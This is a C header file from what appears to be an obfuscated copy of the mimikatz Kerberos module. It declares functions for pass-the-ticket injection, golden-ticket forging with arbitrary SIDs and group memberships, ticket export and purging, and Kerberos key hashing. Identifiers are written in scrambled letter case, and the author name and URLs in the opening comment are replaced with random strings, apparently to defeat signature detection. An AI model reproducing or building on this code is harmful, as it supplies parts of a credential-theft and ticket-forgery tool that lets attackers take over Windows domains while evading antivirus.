/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#pragma once
#include "../kuhl_m.h"
#include "../modules/kull_m_file.h"
#include "../modules/kull_m_cRyPTO_system.h"
#include "kuhl_m_kErberoS_ticket.h"
#include "kuhl_m_kErberoS_pac.h"
#include "kuhl_m_kErberoS_ccaCHe.h"

#define KRB_KEY_USAGE_AS_REP_TGS_REP	2

typedef struct _KUHL_M_KERBEROS_LIFETIME_DATA {
	FILETIME TicketStart;
	FILETIME TicketEnd;
	FILETIME TicketRenew;
} KUHL_M_KERBEROS_LIFETIME_DATA, *PKUHL_M_KERBEROS_LIFETIME_DATA;

const KUHL_M kuhl_m_kErberoS;

NTSTATUS kuhl_m_kErberoS_init();
NTSTATUS kuhl_m_kErberoS_clean();

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus);

NTSTATUS kuhl_m_kErberoS_pTt(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_kErberoS_pTt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg);
void kuhl_m_kErberoS_pTt_file(PCWCHAR filename);
NTSTATUS kuhl_m_kErberoS_pTt_data(PVOID data, DWORD dataSize);
NTSTATUS kuhl_m_kErberoS_golDen(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_ask(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_tgt(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_purge(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_hash(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_decode(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kErberoS_test(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_kErberoS_hash_data_raw(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count, PBYTE *buffer, DWORD *dwBuffer);
NTSTATUS kuhl_m_kErberoS_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count);
wchar_t * kuhl_m_kErberoS_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext);
wchar_t * kuhl_m_kErberoS_generateFileName_short(PJlzW_KERBEROS_TICKET ticket, LPCWSTR ext);
PBERVAL kuhl_m_kErberoS_golDen_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, LPCBYTE key, DWORD keySize, DWORD keyType, PISID sid, LPCWSTR LogonDomainName, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet);
NTSTATUS kuhl_m_kErberoS_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD keySize, LPCVOID data, DWORD dataSize, LPVOID *output, DWORD *outputSize, BOOL encrypt);